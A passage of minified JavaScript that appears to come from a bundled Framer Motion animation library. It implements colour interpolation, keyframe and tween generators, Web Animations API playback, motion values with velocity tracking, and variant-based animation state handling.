  xe = (e, t, n) => e + (t - e) * n;

function qc(e, t, n) {
  return n < 0 && (n += 1), n > 1 && (n -= 1), n < 1 / 6 ? e + (t - e) * 6 * n : n < 1 / 2 ? t : n < 2 / 3 ? e + (t - e) * (2 / 3 - n) * 6 : e
}

function hA({
  hue: e,
  saturation: t,
  lightness: n,
  alpha: r
}) {
  e /= 360, t /= 100, n /= 100;
  let s = 0,
    o = 0,
    i = 0;
  if (!t) s = o = i = n;
  else {
    const a = n < .5 ? n * (1 + t) : n + t - n * t,
      c = 2 * n - a;
    s = qc(c, a, e + 1 / 3), o = qc(c, a, e), i = qc(c, a, e - 1 / 3)
  }
  return {
    red: Math.round(s * 255),
    green: Math.round(o * 255),
    blue: Math.round(i * 255),
    alpha: r
  }
}

function al(e, t) {
  return n => n > 0 ? t : e
}
const Yc = (e, t, n) => {
  const r = e * e,
    s = n * (t * t - r) + r;
  return s < 0 ? 0 : Math.sqrt(s)
},
  mA = [md, Rr, hs],
  pA = e => mA.find(t => t.test(e));

function kp(e) {
  const t = pA(e);
  if (!t) return !1;
  let n = t.parse(e);
  return t === hs && (n = hA(n)), n
}
const Rp = (e, t) => {
  const n = kp(e),
    r = kp(t);
  if (!n || !r) return al(e, t);
  const s = {
    ...n
  };
  return o => (s.red = Yc(n.red, r.red, o), s.green = Yc(n.green, r.green, o), s.blue = Yc(n.blue, r.blue, o), s.alpha = xe(n.alpha, r.alpha, o), Rr.transform(s))
},
  vd = new Set(["none", "hidden"]);

function gA(e, t) {
  return vd.has(e) ? n => n <= 0 ? e : t : n => n >= 1 ? t : e
}

function yA(e, t) {
  return n => xe(e, t, n)
}

function eh(e) {
  return typeof e == "number" ? yA : typeof e == "string" ? Kf(e) ? al : Qe.test(e) ? Rp : wA : Array.isArray(e) ? p1 : typeof e == "object" ? Qe.test(e) ? Rp : vA : al
}

function p1(e, t) {
  const n = [...e],
    r = n.length,
    s = e.map((o, i) => eh(o)(o, t[i]));
  return o => {
    for (let i = 0; i < r; i++) n[i] = s[i](o);
    return n
  }
}

function vA(e, t) {
  const n = {
    ...e,
    ...t
  },
    r = {};
  for (const s in n) e[s] !== void 0 && t[s] !== void 0 && (r[s] = eh(e[s])(e[s], t[s]));
  return s => {
    for (const o in r) n[o] = r[o](s);
    return n
  }
}

function xA(e, t) {
  var n;
  const r = [],
    s = {
      color: 0,
      var: 0,
      number: 0
    };
  for (let o = 0; o < t.values.length; o++) {
    const i = t.types[o],
      a = e.indexes[i][s[i]],
      c = (n = e.values[a]) !== null && n !== void 0 ? n : 0;
    r[o] = c, s[i]++
  }
  return r
}
const wA = (e, t) => {
  const n = mr.createTransformer(t),
    r = mi(e),
    s = mi(t);
  return r.indexes.var.length === s.indexes.var.length && r.indexes.color.length === s.indexes.color.length && r.indexes.number.length >= s.indexes.number.length ? vd.has(e) && !s.values.length || vd.has(t) && !r.values.length ? gA(e, t) : cr(p1(xA(r, s), s.values), n) : al(e, t)
};

function g1(e, t, n) {
  return typeof e == "number" && typeof t == "number" && typeof n == "number" ? xe(e, t, n) : eh(e)(e, t)
}

function bA(e, t, n) {
  const r = [],
    s = n || g1,
    o = e.length - 1;
  for (let i = 0; i < o; i++) {
    let a = s(e[i], e[i + 1]);
    if (t) {
      const c = Array.isArray(t) ? t[i] || Ye : t;
      a = cr(c, a)
    }
    r.push(a)
  }
  return r
}

function SA(e, t, {
  clamp: n = !0,
  ease: r,
  mixer: s
} = {}) {
  const o = e.length;
  if (dd(o === t.length), o === 1) return () => t[0];
  if (o === 2 && e[0] === e[1]) return () => t[1];
  e[0] > e[o - 1] && (e = [...e].reverse(), t = [...t].reverse());
  const i = bA(t, r, s),
    a = i.length,
    c = u => {
      let d = 0;
      if (a > 1)
        for (; d < e.length - 2 && !(u < e[d + 1]); d++);
      const f = Qs(e[d], e[d + 1], u);
      return i[d](f)
    };
  return n ? u => c(Mn(e[0], e[o - 1], u)) : c
}

function CA(e, t) {
  const n = e[e.length - 1];
  for (let r = 1; r <= t; r++) {
    const s = Qs(0, t, r);
    e.push(xe(n, 1, s))
  }
}

function NA(e) {
  const t = [0];
  return CA(t, e.length - 1), t
}

function jA(e, t) {
  return e.map(n => n * t)
}

function AA(e, t) {
  return e.map(() => t || m1).splice(0, e.length - 1)
}

function ll({
  duration: e = 300,
  keyframes: t,
  times: n,
  ease: r = "easeInOut"
}) {
  const s = dA(r) ? r.map(Tp) : Tp(r),
    o = {
      done: !1,
      value: t[0]
    },
    i = jA(n && n.length === t.length ? n : NA(t), e),
    a = SA(i, t, {
      ease: Array.isArray(s) ? s : AA(t, s)
    });
  return {
    calculatedDuration: e,
    next: c => (o.value = a(c), o.done = c >= e, o)
  }
}
const PA = e => {
  const t = ({
    timestamp: n
  }) => e(n);
  return {
    start: () => ue.update(t, !0),
    stop: () => hr(t),
    now: () => Fe.isProcessing ? Fe.timestamp : ln.now()
  }
},
  EA = {
    decay: Pp,
    inertia: Pp,
    tween: ll,
    keyframes: ll,
    spring: h1
  },
  TA = e => e / 100;
class th extends l1 {
  constructor(t) {
    super(t), this.holdTime = null, this.cancelTime = null, this.currentTime = 0, this.playbackSpeed = 1, this.pendingPlayState = "running", this.startTime = null, this.state = "idle", this.stop = () => {
      if (this.resolver.cancel(), this.isStopped = !0, this.state === "idle") return;
      this.teardown();
      const {
        onStop: c
      } = this.options;
      c && c()
    };
    const {
      name: n,
      motionValue: r,
      element: s,
      keyframes: o
    } = this.options, i = (s == null ? void 0 : s.KeyframeResolver) || Qf, a = (c, u) => this.onKeyframesResolved(c, u);
    this.resolver = new i(o, a, n, r, s), this.resolver.scheduleResolve()
  }
  flatten() {
    super.flatten(), this._resolved && Object.assign(this._resolved, this.initPlayback(this._resolved.keyframes))
  }
  initPlayback(t) {
    const {
      type: n = "keyframes",
      repeat: r = 0,
      repeatDelay: s = 0,
      repeatType: o,
      velocity: i = 0
    } = this.options, a = Jf(n) ? n : EA[n] || ll;
    let c, u;
    a !== ll && typeof t[0] != "number" && (c = cr(TA, g1(t[0], t[1])), t = [0, 100]);
    const d = a({
      ...this.options,
      keyframes: t
    });
    o === "mirror" && (u = a({
      ...this.options,
      keyframes: [...t].reverse(),
      velocity: -i
    })), d.calculatedDuration === null && (d.calculatedDuration = f1(d));
    const {
      calculatedDuration: f
    } = d, h = f + s, y = h * (r + 1) - s;
    return {
      generator: d,
      mirroredGenerator: u,
      mapPercentToKeyframes: c,
      calculatedDuration: f,
      resolvedDuration: h,
      totalDuration: y
    }
  }
  onPostResolved() {
    const {
      autoplay: t = !0
    } = this.options;
    this.play(), this.pendingPlayState === "paused" || !t ? this.pause() : this.state = this.pendingPlayState
  }
  tick(t, n = !1) {
    const {
      resolved: r
    } = this;
    if (!r) {
      const {
        keyframes: P
      } = this.options;
      return {
        done: !0,
        value: P[P.length - 1]
      }
    }
    const {
      finalKeyframe: s,
      generator: o,
      mirroredGenerator: i,
      mapPercentToKeyframes: a,
      keyframes: c,
      calculatedDuration: u,
      totalDuration: d,
      resolvedDuration: f
    } = r;
    if (this.startTime === null) return o.next(0);
    const {
      delay: h,
      repeat: y,
      repeatType: w,
      repeatDelay: v,
      onUpdate: S
    } = this.options;
    this.speed > 0 ? this.startTime = Math.min(this.startTime, t) : this.speed < 0 && (this.startTime = Math.min(t - d / this.speed, this.startTime)), n ? this.currentTime = t : this.holdTime !== null ? this.currentTime = this.holdTime : this.currentTime = Math.round(t - this.startTime) * this.speed;
    const g = this.currentTime - h * (this.speed >= 0 ? 1 : -1),
      p = this.speed >= 0 ? g < 0 : g > d;
    this.currentTime = Math.max(g, 0), this.state === "finished" && this.holdTime === null && (this.currentTime = d);
    let m = this.currentTime,
      b = o;
    if (y) {
      const P = Math.min(this.currentTime, d) / f;
      let M = Math.floor(P),
        _ = P % 1;
      !_ && P >= 1 && (_ = 1), _ === 1 && M--, M = Math.min(M, y + 1), !!(M % 2) && (w === "reverse" ? (_ = 1 - _, v && (_ -= v / f)) : w === "mirror" && (b = i)), m = Mn(0, 1, _) * f
    }
    const C = p ? {
      done: !1,
      value: c[0]
    } : b.next(m);
    a && (C.value = a(C.value));
    let {
      done: j
    } = C;
    !p && u !== null && (j = this.speed >= 0 ? this.currentTime >= d : this.currentTime <= 0);
    const A = this.holdTime === null && (this.state === "finished" || this.state === "running" && j);
    return A && s !== void 0 && (C.value = Kl(c, this.options, s)), S && S(C.value), A && this.finish(), C
  }
  get duration() {
    const {
      resolved: t
    } = this;
    return t ? Pn(t.calculatedDuration) : 0
  }
  get time() {
    return Pn(this.currentTime)
  }
  set time(t) {
    t = An(t), this.currentTime = t, this.holdTime !== null || this.speed === 0 ? this.holdTime = t : this.driver && (this.startTime = this.driver.now() - t / this.speed)
  }
  get speed() {
    return this.playbackSpeed
  }
  set speed(t) {
    const n = this.playbackSpeed !== t;
    this.playbackSpeed = t, n && (this.time = Pn(this.currentTime))
  }
  play() {
    if (this.resolver.isScheduled || this.resolver.resume(), !this._resolved) {
      this.pendingPlayState = "running";
      return
    }
    if (this.isStopped) return;
    const {
      driver: t = PA,
      onPlay: n,
      startTime: r
    } = this.options;
    this.driver || (this.driver = t(o => this.tick(o))), n && n();
    const s = this.driver.now();
    this.holdTime !== null ? this.startTime = s - this.holdTime : this.startTime ? this.state === "finished" && (this.startTime = s) : this.startTime = r ?? this.calcStartTime(), this.state === "finished" && this.updateFinishedPromise(), this.cancelTime = this.startTime, this.holdTime = null, this.state = "running", this.driver.start()
  }
  pause() {
    var t;
    if (!this._resolved) {
      this.pendingPlayState = "paused";
      return
    }
    this.state = "paused", this.holdTime = (t = this.currentTime) !== null && t !== void 0 ? t : 0
  }
  complete() {
    this.state !== "running" && this.play(), this.pendingPlayState = this.state = "finished", this.holdTime = null
  }
  finish() {
    this.teardown(), this.state = "finished";
    const {
      onComplete: t
    } = this.options;
    t && t()
  }
  cancel() {
    this.cancelTime !== null && this.tick(this.cancelTime), this.teardown(), this.updateFinishedPromise()
  }
  teardown() {
    this.state = "idle", this.stopDriver(), this.resolveFinishedPromise(), this.updateFinishedPromise(), this.startTime = this.cancelTime = null, this.resolver.cancel()
  }
  stopDriver() {
    this.driver && (this.driver.stop(), this.driver = void 0)
  }
  sample(t) {
    return this.startTime = 0, this.tick(t, !0)
  }
}
const kA = new Set(["opacity", "clipPath", "filter", "transform"]);

function nh(e) {
  let t;
  return () => (t === void 0 && (t = e()), t)
}
const RA = {
  linearEasing: void 0
};

function DA(e, t) {
  const n = nh(e);
  return () => {
    var r;
    return (r = RA[t]) !== null && r !== void 0 ? r : n()
  }
}
const cl = DA(() => {
  try {
    document.createElement("div").animate({
      opacity: 0
    }, {
      easing: "linear(0, 1)"
    })
  } catch {
    return !1
  }
  return !0
}, "linearEasing");

function y1(e) {
  return !!(typeof e == "function" && cl() || !e || typeof e == "string" && (e in xd || cl()) || Zf(e) || Array.isArray(e) && e.every(y1))
}
const Ao = ([e, t, n, r]) => `cubic-bezier(${e}, ${t}, ${n}, ${r})`,
  xd = {
    linear: "linear",
    ease: "ease",
    easeIn: "ease-in",
    easeOut: "ease-out",
    easeInOut: "ease-in-out",
    circIn: Ao([0, .65, .55, 1]),
    circOut: Ao([.55, 0, 1, .45]),
    backIn: Ao([.31, .01, .66, -.59]),
    backOut: Ao([.33, 1.53, .69, .99])
  };

function v1(e, t) {
  if (e) return typeof e == "function" && cl() ? c1(e, t) : Zf(e) ? Ao(e) : Array.isArray(e) ? e.map(n => v1(n, t) || xd.easeOut) : xd[e]
}

function MA(e, t, n, {
  delay: r = 0,
  duration: s = 300,
  repeat: o = 0,
  repeatType: i = "loop",
  ease: a = "easeInOut",
  times: c
} = {}) {
  const u = {
    [t]: n
  };
  c && (u.offset = c);
  const d = v1(a, s);
  return Array.isArray(d) && (u.easing = d), e.animate(u, {
    delay: r,
    duration: s,
    easing: Array.isArray(d) ? "linear" : d,
    fill: "both",
    iterations: o + 1,
    direction: i === "reverse" ? "alternate" : "normal"
  })
}

function Dp(e, t) {
  e.timeline = t, e.onfinish = null
}
const _A = nh(() => Object.hasOwnProperty.call(Element.prototype, "animate")),
  ul = 10,
  IA = 2e4;

function LA(e) {
  return Jf(e.type) || e.type === "spring" || !y1(e.ease)
}

function OA(e, t) {
  const n = new th({
    ...t,
    keyframes: e,
    repeat: 0,
    delay: 0,
    isGenerator: !0
  });
  let r = {
    done: !1,
    value: e[0]
  };
  const s = [];
  let o = 0;
  for (; !r.done && o < IA;) r = n.sample(o), s.push(r.value), o += ul;
  return {
    times: void 0,
    keyframes: s,
    duration: o - ul,
    ease: "linear"
  }
}
const x1 = {
  anticipate: $x,
  backInOut: Ux,
  circInOut: Wx
};

function FA(e) {
  return e in x1
}
class Mp extends l1 {
  constructor(t) {
    super(t);
    const {
      name: n,
      motionValue: r,
      element: s,
      keyframes: o
    } = this.options;
    this.resolver = new a1(o, (i, a) => this.onKeyframesResolved(i, a), n, r, s), this.resolver.scheduleResolve()
  }
  initPlayback(t, n) {
    var r;
    let {
      duration: s = 300,
      times: o,
      ease: i,
      type: a,
      motionValue: c,
      name: u,
      startTime: d
    } = this.options;
    if (!(!((r = c.owner) === null || r === void 0) && r.current)) return !1;
    if (typeof i == "string" && cl() && FA(i) && (i = x1[i]), LA(this.options)) {
      const {
        onComplete: h,
        onUpdate: y,
        motionValue: w,
        element: v,
        ...S
      } = this.options, g = OA(t, S);
      t = g.keyframes, t.length === 1 && (t[1] = t[0]), s = g.duration, o = g.times, i = g.ease, a = "keyframes"
    }
    const f = MA(c.owner.current, u, t, {
      ...this.options,
      duration: s,
      times: o,
      ease: i
    });
    return f.startTime = d ?? this.calcStartTime(), this.pendingTimeline ? (Dp(f, this.pendingTimeline), this.pendingTimeline = void 0) : f.onfinish = () => {
      const {
        onComplete: h
      } = this.options;
      c.set(Kl(t, this.options, n)), h && h(), this.cancel(), this.resolveFinishedPromise()
    }, {
      animation: f,
      duration: s,
      times: o,
      type: a,
      ease: i,
      keyframes: t
    }
  }
  get duration() {
    const {
      resolved: t
    } = this;
    if (!t) return 0;
    const {
      duration: n
    } = t;
    return Pn(n)
  }
  get time() {
    const {
      resolved: t
    } = this;
    if (!t) return 0;
    const {
      animation: n
    } = t;
    return Pn(n.currentTime || 0)
  }
  set time(t) {
    const {
      resolved: n
    } = this;
    if (!n) return;
    const {
      animation: r
    } = n;
    r.currentTime = An(t)
  }
  get speed() {
    const {
      resolved: t
    } = this;
    if (!t) return 1;
    const {
      animation: n
    } = t;
    return n.playbackRate
  }
  set speed(t) {
    const {
      resolved: n
    } = this;
    if (!n) return;
    const {
      animation: r
    } = n;
    r.playbackRate = t
  }
  get state() {
    const {
      resolved: t
    } = this;
    if (!t) return "idle";
    const {
      animation: n
    } = t;
    return n.playState
  }
  get startTime() {
    const {
      resolved: t
    } = this;
    if (!t) return null;
    const {
      animation: n
    } = t;
    return n.startTime
  }
  attachTimeline(t) {
    if (!this._resolved) this.pendingTimeline = t;
    else {
      const {
        resolved: n
      } = this;
      if (!n) return Ye;
      const {
        animation: r
      } = n;
      Dp(r, t)
    }
    return Ye
  }
  play() {
    if (this.isStopped) return;
    const {
      resolved: t
    } = this;
    if (!t) return;
    const {
      animation: n
    } = t;
    n.playState === "finished" && this.updateFinishedPromise(), n.play()
  }
  pause() {
    const {
      resolved: t
    } = this;
    if (!t) return;
    const {
      animation: n
    } = t;
    n.pause()
  }
  stop() {
    if (this.resolver.cancel(), this.isStopped = !0, this.state === "idle") return;
    this.resolveFinishedPromise(), this.updateFinishedPromise();
    const {
      resolved: t
    } = this;
    if (!t) return;
    const {
      animation: n,
      keyframes: r,
      duration: s,
      type: o,
      ease: i,
      times: a
    } = t;
    if (n.playState === "idle" || n.playState === "finished") return;
    if (this.time) {
      const {
        motionValue: u,
        onUpdate: d,
        onComplete: f,
        element: h,
        ...y
      } = this.options, w = new th({
        ...y,
        keyframes: r,
        duration: s,
        type: o,
        ease: i,
        times: a,
        isGenerator: !0
      }), v = An(this.time);
      u.setWithVelocity(w.sample(v - ul).value, w.sample(v).value, ul)
    }
    const {
      onStop: c
    } = this.options;
    c && c(), this.cancel()
  }
  complete() {
    const {
      resolved: t
    } = this;
    t && t.animation.finish()
  }
  cancel() {
    const {
      resolved: t
    } = this;
    t && t.animation.cancel()
  }
  static supports(t) {
    const {
      motionValue: n,
      name: r,
      repeatDelay: s,
      repeatType: o,
      damping: i,
      type: a
    } = t;
    return _A() && r && kA.has(r) && n && n.owner && n.owner.current instanceof HTMLElement && !n.owner.getProps().onUpdate && !s && o !== "mirror" && i !== 0 && a !== "inertia"
  }
}
const VA = nh(() => window.ScrollTimeline !== void 0);
class BA {
  constructor(t) {
    this.stop = () => this.runAll("stop"), this.animations = t.filter(Boolean)
  }
  then(t, n) {
    return Promise.all(this.animations).then(t).catch(n)
  }
  getAll(t) {
    return this.animations[0][t]
  }
  setAll(t, n) {
    for (let r = 0; r < this.animations.length; r++) this.animations[r][t] = n
  }
  attachTimeline(t, n) {
    const r = this.animations.map(s => VA() && s.attachTimeline ? s.attachTimeline(t) : n(s));
    return () => {
      r.forEach((s, o) => {
        s && s(), this.animations[o].stop()
      })
    }
  }
  get time() {
    return this.getAll("time")
  }
  set time(t) {
    this.setAll("time", t)
  }
  get speed() {
    return this.getAll("speed")
  }
  set speed(t) {
    this.setAll("speed", t)
  }
  get startTime() {
    return this.getAll("startTime")
  }
  get duration() {
    let t = 0;
    for (let n = 0; n < this.animations.length; n++) t = Math.max(t, this.animations[n].duration);
    return t
  }
  runAll(t) {
    this.animations.forEach(n => n[t]())
  }
  flatten() {
    this.runAll("flatten")
  }
  play() {
    this.runAll("play")
  }
  pause() {
    this.runAll("pause")
  }
  cancel() {
    this.runAll("cancel")
  }
  complete() {
    this.runAll("complete")
  }
}

function zA({
  when: e,
  delay: t,
  delayChildren: n,
  staggerChildren: r,
  staggerDirection: s,
  repeat: o,
  repeatType: i,
  repeatDelay: a,
  from: c,
  elapsed: u,
  ...d
}) {
  return !!Object.keys(d).length
}
const rh = (e, t, n, r = {}, s, o) => i => {
  const a = $f(r, e) || {},
    c = a.delay || r.delay || 0;
  let {
    elapsed: u = 0
  } = r;
  u = u - An(c);
  let d = {
    keyframes: Array.isArray(n) ? n : [null, n],
    ease: "easeOut",
    velocity: t.getVelocity(),
    ...a,
    delay: -u,
    onUpdate: h => {
      t.set(h), a.onUpdate && a.onUpdate(h)
    },
    onComplete: () => {
      i(), a.onComplete && a.onComplete()
    },
    name: e,
    motionValue: t,
    element: o ? void 0 : s
  };
  zA(a) || (d = {
    ...d,
    ...fj(e, d)
  }), d.duration && (d.duration = An(d.duration)), d.repeatDelay && (d.repeatDelay = An(d.repeatDelay)), d.from !== void 0 && (d.keyframes[0] = d.from);
  let f = !1;
  if ((d.type === !1 || d.duration === 0 && !d.repeatDelay) && (d.duration = 0, d.delay === 0 && (f = !0)), f && !o && t.get() !== void 0) {
    const h = Kl(d.keyframes, a);
    if (h !== void 0) return ue.update(() => {
      d.onUpdate(h), d.onComplete()
    }), new BA([])
  }
  return !o && Mp.supports(d) ? new Mp(d) : new th(d)
},
  UA = e => !!(e && typeof e == "object" && e.mix && e.toValue),
  $A = e => ud(e) ? e[e.length - 1] || 0 : e;

function sh(e, t) {
  e.indexOf(t) === -1 && e.push(t)
}

function oh(e, t) {
  const n = e.indexOf(t);
  n > -1 && e.splice(n, 1)
}
class ih {
  constructor() {
    this.subscriptions = []
  }
  add(t) {
    return sh(this.subscriptions, t), () => oh(this.subscriptions, t)
  }
  notify(t, n, r) {
    const s = this.subscriptions.length;
    if (s)
      if (s === 1) this.subscriptions[0](t, n, r);
      else
        for (let o = 0; o < s; o++) {
          const i = this.subscriptions[o];
          i && i(t, n, r)
        }
  }
  getSize() {
    return this.subscriptions.length
  }
  clear() {
    this.subscriptions.length = 0
  }
}
const _p = 30,
  HA = e => !isNaN(parseFloat(e));
class WA {
  constructor(t, n = {}) {
    this.version = "11.13.1", this.canTrackVelocity = null, this.events = {}, this.updateAndNotify = (r, s = !0) => {
      const o = ln.now();
      this.updatedAt !== o && this.setPrevFrameValue(), this.prev = this.current, this.setCurrent(r), this.current !== this.prev && this.events.change && this.events.change.notify(this.current), s && this.events.renderRequest && this.events.renderRequest.notify(this.current)
    }, this.hasAnimated = !1, this.setCurrent(t), this.owner = n.owner
  }
  setCurrent(t) {
    this.current = t, this.updatedAt = ln.now(), this.canTrackVelocity === null && t !== void 0 && (this.canTrackVelocity = HA(this.current))
  }
  setPrevFrameValue(t = this.current) {
    this.prevFrameValue = t, this.prevUpdatedAt = this.updatedAt
  }
  onChange(t) {
    return this.on("change", t)
  }
  on(t, n) {
    this.events[t] || (this.events[t] = new ih);
    const r = this.events[t].add(n);
    return t === "change" ? () => {
      r(), ue.read(() => {
        this.events.change.getSize() || this.stop()
      })
    } : r
  }
  clearListeners() {
    for (const t in this.events) this.events[t].clear()
  }
  attach(t, n) {
    this.passiveEffect = t, this.stopPassiveEffect = n
  }
  set(t, n = !0) {
    !n || !this.passiveEffect ? this.updateAndNotify(t, n) : this.passiveEffect(t, this.updateAndNotify)
  }
  setWithVelocity(t, n, r) {
    this.set(n), this.prev = void 0, this.prevFrameValue = t, this.prevUpdatedAt = this.updatedAt - r
  }
  jump(t, n = !0) {
    this.updateAndNotify(t), this.prev = t, this.prevUpdatedAt = this.prevFrameValue = void 0, n && this.stop(), this.stopPassiveEffect && this.stopPassiveEffect()
  }
  get() {
    return this.current
  }
  getPrevious() {
    return this.prev
  }
  getVelocity() {
    const t = ln.now();
    if (!this.canTrackVelocity || this.prevFrameValue === void 0 || t - this.updatedAt > _p) return 0;
    const n = Math.min(this.updatedAt - this.prevUpdatedAt, _p);
    return u1(parseFloat(this.current) - parseFloat(this.prevFrameValue), n)
  }
  start(t) {
    return this.stop(), new Promise(n => {
      this.hasAnimated = !0, this.animation = t(n), this.events.animationStart && this.events.animationStart.notify()
    }).then(() => {
      this.events.animationComplete && this.events.animationComplete.notify(), this.clearAnimation()
    })
  }
  stop() {
    this.animation && (this.animation.stop(), this.events.animationCancel && this.events.animationCancel.notify()), this.clearAnimation()
  }
  isAnimating() {
    return !!this.animation
  }
  clearAnimation() {
    delete this.animation
  }
  destroy() {
    this.clearListeners(), this.stop(), this.stopPassiveEffect && this.stopPassiveEffect()
  }
}

function pi(e, t) {
  return new WA(e, t)
}

function KA(e, t, n) {
  e.hasValue(t) ? e.getValue(t).set(n) : e.addValue(t, pi(n))
}

function QA(e, t) {
  const n = Wl(e, t);
  let {
    transitionEnd: r = {},
    transition: s = {},
    ...o
  } = n || {};
  o = {
    ...o,
    ...r
  };
  for (const i in o) {
    const a = $A(o[i]);
    KA(e, i, a)
  }
}
const ah = e => e.replace(/([a-z])([A-Z])/gu, "$1-$2").toLowerCase(),
  GA = "framerAppearId",
  w1 = "data-" + ah(GA);

function b1(e) {
  return e.props[w1]
}
const qe = e => !!(e && e.getVelocity);

function qA(e) {
  return !!(qe(e) && e.add)
}

function wd(e, t) {
  const n = e.getValue("willChange");
  if (qA(n)) return n.add(t)
}

function YA({
  protectedKeys: e,
  needsAnimating: t
}, n) {
  const r = e.hasOwnProperty(n) && t[n] !== !0;
  return t[n] = !1, r
}

function S1(e, t, {
  delay: n = 0,
  transitionOverride: r,
  type: s
} = {}) {
  var o;
  let {
    transition: i = e.getDefaultTransition(),
    transitionEnd: a,
    ...c
  } = t;
  r && (i = r);
  const u = [],
    d = s && e.animationState && e.animationState.getState()[s];
  for (const f in c) {
    const h = e.getValue(f, (o = e.latestValues[f]) !== null && o !== void 0 ? o : null),
      y = c[f];
    if (y === void 0 || d && YA(d, f)) continue;
    const w = {
      delay: n,
      ...$f(i || {}, f)
    };
    let v = !1;
    if (window.MotionHandoffAnimation) {
      const g = b1(e);
      if (g) {
        const p = window.MotionHandoffAnimation(g, f, ue);
        p !== null && (w.startTime = p, v = !0)
      }
    }
    wd(e, f), h.start(rh(f, h, y, e.shouldReduceMotion && Qr.has(f) ? {
      type: !1
    } : w, e, v));
    const S = h.animation;
    S && u.push(S)
  }
  return a && Promise.all(u).then(() => {
    ue.update(() => {
      a && QA(e, a)
    })
  }), u
}

function bd(e, t, n = {}) {
  var r;
  const s = Wl(e, t, n.type === "exit" ? (r = e.presenceContext) === null || r === void 0 ? void 0 : r.custom : void 0);
  let {
    transition: o = e.getDefaultTransition() || {}
  } = s || {};
  n.transitionOverride && (o = n.transitionOverride);
  const i = s ? () => Promise.all(S1(e, s, n)) : () => Promise.resolve(),
    a = e.variantChildren && e.variantChildren.size ? (u = 0) => {
      const {
        delayChildren: d = 0,
        staggerChildren: f,
        staggerDirection: h
      } = o;
      return XA(e, t, d + u, f, h, n)
    } : () => Promise.resolve(),
    {
      when: c
    } = o;
  if (c) {
    const [u, d] = c === "beforeChildren" ? [i, a] : [a, i];
    return u().then(() => d())
  } else return Promise.all([i(), a(n.delay)])
}

function XA(e, t, n = 0, r = 0, s = 1, o) {
  const i = [],
    a = (e.variantChildren.size - 1) * r,
    c = s === 1 ? (u = 0) => u * r : (u = 0) => a - u * r;
  return Array.from(e.variantChildren).sort(JA).forEach((u, d) => {
    u.notify("AnimationStart", t), i.push(bd(u, t, {
      ...o,
      delay: n + c(d)
    }).then(() => u.notify("AnimationComplete", t)))
  }), Promise.all(i)
}

function JA(e, t) {
  return e.sortNodePosition(t)
}

function ZA(e, t, n = {}) {
  e.notify("AnimationStart", t);
  let r;
  if (Array.isArray(t)) {
    const s = t.map(o => bd(e, o, n));
    r = Promise.all(s)
  } else if (typeof t == "string") r = bd(e, t, n);
  else {
    const s = typeof t == "function" ? Wl(e, t, n.custom) : t;
    r = Promise.all(S1(e, s, n))
  }
  return r.then(() => {
    e.notify("AnimationComplete", t)
  })
}
const e4 = Uf.length;

function C1(e) {
  if (!e) return;
  if (!e.isControllingVariants) {
    const n = e.parent ? C1(e.parent) || {} : {};
    return e.props.initial !== void 0 && (n.initial = e.props.initial), n
  }
  const t = {};
  for (let n = 0; n < e4; n++) {
    const r = Uf[n],
      s = e.props[r];
    (fi(s) || s === !1) && (t[r] = s)
  }
  return t
}
const t4 = [...zf].reverse(),
  n4 = zf.length;

function r4(e) {
  return t => Promise.all(t.map(({
    animation: n,
    options: r
  }) => ZA(e, n, r)))
}

function s4(e) {
  let t = r4(e),
    n = Ip(),
    r = !0;
  const s = c => (u, d) => {
    var f;
    const h = Wl(e, d, c === "exit" ? (f = e.presenceContext) === null || f === void 0 ? void 0 : f.custom : void 0);
    if (h) {
      const {
        transition: y,
        transitionEnd: w,
        ...v
      } = h;
      u = {
        ...u,
        ...v,
        ...w
      }
    }
    return u
  };

  function o(c) {
    t = c(e)
  }

  function i(c) {
    const {
      props: u
    } = e, d = C1(e.parent) || {}, f = [], h = new Set;
    let y = {},
      w = 1 / 0;
    for (let S = 0; S < n4; S++) {
      const g = t4[S],
        p = n[g],
        m = u[g] !== void 0 ? u[g] : d[g],
        b = fi(m),
        C = g === c ? p.isActive : null;
      C === !1 && (w = S);
      let j = m === d[g] && m !== u[g] && b;
      if (j && r && e.manuallyAnimateOnMount && (j = !1), p.protectedKeys = {
        ...y
      }, !p.isActive && C === null || !m && !p.prevProp || Hl(m) || typeof m == "boolean") continue;
      const A = o4(p.prevProp, m);
      let P = A || g === c && p.isActive && !j && b || S > w && b,
        M = !1;
      const _ = Array.isArray(m) ? m : [m];
      let G = _.reduce(s(g), {});
      C === !1 && (G = {});
      const {
        prevResolvedValues: I = {}
      } = p, $ = {
        ...I,
        ...G
      }, U = X => {
        P = !0, h.has(X) && (M = !0, h.delete(X)), p.needsAnimating[X] = !0;
        const D = e.getValue(X);
        D && (D.liveStyle = !1)
      };
      for (const X in $) {
        const D = G[X],
          R = I[X];
        if (y.hasOwnProperty(X)) continue;
        let L = !1;
        ud(D) && ud(R) ? L = !Lx(D, R) : L = D !== R, L ? D != null ? U(X) : h.add(X) : D !== void 0 && h.has(X) ? U(X) : p.protectedKeys[X] = !0
      }
      p.prevProp = m, p.prevResolvedValues = G, p.isActive && (y = {
        ...y,
        ...G
      }), r && e.blockInitialAnimation && (P = !1), P && (!(j && A) || M) && f.push(..._.map(X => ({
        animation: X,
        options: {
          type: g
        }
      })))
    }
    if (h.size) {
      const S = {};
      h.forEach(g => {
        const p = e.getBaseTarget(g),
          m = e.getValue(g);
        m && (m.liveStyle = !0), S[g] = p ?? null
      }), f.push({
        animation: S
      })
    }
    let v = !!f.length;
    return r && (u.initial === !1 || u.initial === u.animate) && !e.manuallyAnimateOnMount && (v = !1), r = !1, v ? t(f) : Promise.resolve()
  }

  function a(c, u) {
    var d;
    if (n[c].isActive === u) return Promise.resolve();
    (d = e.variantChildren) === null || d === void 0 || d.forEach(h => {
      var y;
      return (y = h.animationState) === null || y === void 0 ? void 0 : y.setActive(c, u)
    }), n[c].isActive = u;
    const f = i(c);
    for (const h in n) n[h].protectedKeys = {};
    return f
  }
  return {
    animateChanges: i,
    setActive: a,
    setAnimateFunction: o,
    getState: () => n,
    reset: () => {
      n = Ip(), r = !0
    }
  }
}

function o4(e, t) {
  return typeof t == "string" ? t !== e : Array.isArray(t) ? !Lx(t, e) : !1
}

function Sr(e = !1) {
  return {
    isActive: e,
    protectedKeys: {},
    needsAnimating: {},
    prevResolvedValues: {}
  }
}

function Ip() {
  return {
    animate: Sr(!0),
    whileInView: Sr(),
    whileHover: Sr(),
    whileTap: Sr(),
    whileDrag: Sr(),
    whileFocus: Sr(),
    exit: Sr()
  }
}
class xr {
  constructor(t) {
    this.isMounted = !1, this.node = t
  }
  update() { }
}
class i4 extends xr {
  constructor(t) {
    super(t), t.animationState || (t.animationState = s4(t))
  }
  updateAnimationControlsSubscription() {
    const {
      animate: t
    } = this.node.getProps();
